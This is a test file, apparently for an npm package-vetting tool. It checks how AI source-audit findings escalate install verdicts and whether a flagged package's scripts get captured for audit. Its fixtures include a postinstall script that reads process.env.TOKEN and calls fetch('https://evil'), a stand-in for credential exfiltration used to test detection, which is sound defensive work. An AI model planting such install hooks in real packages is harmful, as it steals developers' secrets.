import { createHash } from "node:crypto";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import * as tar from "tar";
import { afterEach, describe, expect, it, vi } from "vitest";
import { foldSourceAudit } from "../src/rules.js";
import { applySourceAudit, buildPackageSignals, type PendingAudit } from "../src/pipeline.js";
import { resetNpmrcCacheForTests } from "../src/npmrc.js";
import type { AiProvider, SourceAuditInput } from "../src/providers/types.js";
import type { RiskAssessment, SourceAuditFinding } from "../src/types.js";
import { makeSignals } from "./helpers.js";

const clean = makeSignals(); // deterministic verdict: allow
const assess = (decision: RiskAssessment["decision"]): RiskAssessment => ({
  risk: "low",
  decision,
  summary: "s",
  reasons: ["base reason"],
  recommendedAction: "a",
  source: "ai",
});
const finding = (severity: SourceAuditFinding["severity"]): SourceAuditFinding => ({
  severity,
  file: "a.js",
  summary: `${severity} issue`,
});

describe("foldSourceAudit — escalation only", () => {
  it("returns the assessment unchanged when there are no findings", () => {
    const a = assess("allow");
    expect(foldSourceAudit(a, [], clean)).toBe(a);
  });

  it("escalates a clean verdict to block on a high finding", () => {
    const r = foldSourceAudit(assess("allow"), [finding("high")], clean);
    expect(r.decision).toBe("block");
    expect(r.reasons.join(" ")).toContain("[code-audit high]");
  });

  it("escalates to require_approval on a medium finding", () => {
    expect(foldSourceAudit(assess("allow"), [finding("medium")], clean).decision).toBe("require_approval");
  });

  it("takes the worst severity across findings", () => {
    const r = foldSourceAudit(assess("allow"), [finding("low"), finding("high"), finding("info")], clean);
    expect(r.decision).toBe("block");
  });

  it("never downgrades a stricter existing verdict", () => {
    // block assessment + a mere low finding must stay block.
    expect(foldSourceAudit(assess("block"), [finding("low")], clean).decision).toBe("block");
  });

  it("cannot pull a hard-blocked package below the deterministic floor", () => {
    const malicious = makeSignals({ knownMalicious: true, maliciousRecords: [{ id: "MAL-1" }] as never });
    // Even fed an "info" finding and a permissive base verdict, the clamp keeps block.
    const r = foldSourceAudit(assess("allow"), [finding("info")], malicious);
    expect(r.decision).toBe("block");
  });
});

function fakeProvider(
  onCall: () => SourceAuditFinding[] | Promise<SourceAuditFinding[]>,
): AiProvider {
  return {
    name: "fake",
    model: "m",
    assess: async () => {
      throw new Error("unused");
    },
    assessBatch: async () => [],
    analyzeSource: async () => onCall(),
  };
}

const pending = (): PendingAudit => ({
  input: {
    package: "pkg",
    version: "1.0.0",
    files: [{ relPath: "a.js", content: "process.env.X", truncated: false }],
  } satisfies SourceAuditInput,
  digest: "sha512-D",
  dropped: [{ count: 1, reason: "budget" }],
});

describe("applySourceAudit", () => {
  const noCache = { cache: undefined, cwd: undefined };

  it("is a no-op without a provider", async () => {
    const a = assess("allow");
    const out = await applySourceAudit(null, pending(), a, clean, noCache);
    expect(out.assessment).toBe(a);
    expect(out.result).toBeUndefined();
  });

  it("is a no-op when the provider has no analyzeSource", async () => {
    const provider: AiProvider = {
      name: "x",
      model: "m",
      assess: async () => {
        throw new Error("unused");
      },
      assessBatch: async () => [],
    };
    const a = assess("allow");
    expect((await applySourceAudit(provider, pending(), a, clean, noCache)).assessment).toBe(a);
  });

  it("escalates and reports findings", async () => {
    const provider = fakeProvider(() => [finding("high")]);
    const out = await applySourceAudit(provider, pending(), assess("allow"), clean, noCache);
    expect(out.assessment.decision).toBe("block");
    expect(out.result?.source).toBe("ai");
    expect(out.result?.findings).toHaveLength(1);
    expect(out.result?.dropped).toEqual([{ count: 1, reason: "budget" }]);
  });

  it("degrades to no change when the model call throws", async () => {
    const provider = fakeProvider(() => {
      throw new Error("boom");
    });
    const a = assess("allow");
    const out = await applySourceAudit(provider, pending(), a, clean, noCache);
    expect(out.assessment).toBe(a); // unchanged
    expect(out.result?.source).toBe("skipped");
  });
});

// --- integration: the scope gate + excerpt capture in buildPackageSignals ---
describe("buildPackageSignals audit gate", () => {
  let dir = "";
  let cwd = "";
  afterEach(async () => {
    vi.unstubAllGlobals();
    if (cwd) process.chdir(cwd);
    resetNpmrcCacheForTests();
    if (dir) await rm(dir, { recursive: true, force: true });
    dir = "";
    cwd = "";
  });

  const sri = (b: Buffer) => `sha512-${createHash("sha512").update(b).digest("base64")}`;

  async function tarball(files: Record<string, string>): Promise<Buffer> {
    const work = await mkdtemp(path.join(tmpdir(), "targate-audit-tar-"));
    try {
      for (const [rel, content] of Object.entries(files)) {
        const full = path.join(work, "package", rel);
        await mkdir(path.dirname(full), { recursive: true });
        await writeFile(full, content);
      }
      const file = path.join(work, "package.tgz");
      await tar.c({ gzip: true, cwd: work, file }, ["package"]);
      return await readFile(file);
    } finally {
      await rm(work, { recursive: true, force: true });
    }
  }

  async function build(scope: "off" | "flagged", files: Record<string, string>, scripts: Record<string, string>) {
    cwd = process.cwd();
    dir = await mkdtemp(path.join(tmpdir(), "targate-audit-int-"));
    await writeFile(path.join(dir, ".npmrc"), "registry=https://mirror.example/\n");
    process.chdir(dir);
    resetNpmrcCacheForTests();
    const bytes = await tarball({ "package.json": JSON.stringify({ name: "public-pkg", version: "1.0.0", scripts }), ...files });
    const integrity = sri(bytes);
    vi.stubGlobal("fetch", vi.fn(async (input: string | URL) => {
      const url = String(input);
      if (url.endsWith(".tgz")) return { ok: true, status: 200, arrayBuffer: async () => bytes };
      return {
        ok: true,
        status: 200,
        json: async () => ({
          "dist-tags": { latest: "1.0.0" },
          versions: {
            "1.0.0": {
              name: "public-pkg",
              repository: { url: "https://github.com/example/public-pkg" },
              dist: { tarball: "https://mirror.example/public-pkg.tgz", integrity },
              scripts,
              dependencies: {},
            },
          },
          time: { created: "2020-01-01T00:00:00Z", "1.0.0": "2020-01-01T00:00:00Z" },
        }),
      };
    }));
    return buildPackageSignals("public-pkg", "1.0.0", {
      noReputation: true,
      osv: { knownMalicious: false, maliciousRecords: [], advisories: [], unavailable: false },
      cwd: dir,
      codeAudit: scope,
    });
  }

  it("captures risky excerpts for a flagged package (install script present)", async () => {
    const built = await build(
      "flagged",
      { "scripts/setup.js": "process.env.TOKEN; fetch('https://evil')" },
      { postinstall: "node scripts/setup.js" },
    );
    expect(built.audit).toBeDefined();
    expect(built.audit?.input.files.map((f) => f.relPath)).toContain("scripts/setup.js");
    expect(built.audit?.digest).toBe(built.signals.artifact.digest);
  });

  it("does not capture anything when scope is off", async () => {
    const built = await build(
      "off",
      { "scripts/setup.js": "process.env.TOKEN; fetch('https://evil')" },
      { postinstall: "node scripts/setup.js" },
    );
    expect(built.audit).toBeUndefined();
  });

  it("does not audit a clean package under scope=flagged", async () => {
    const built = await build("flagged", { "index.js": "export const add = (a, b) => a + b;" }, {});
    expect(built.audit).toBeUndefined();
  });
});
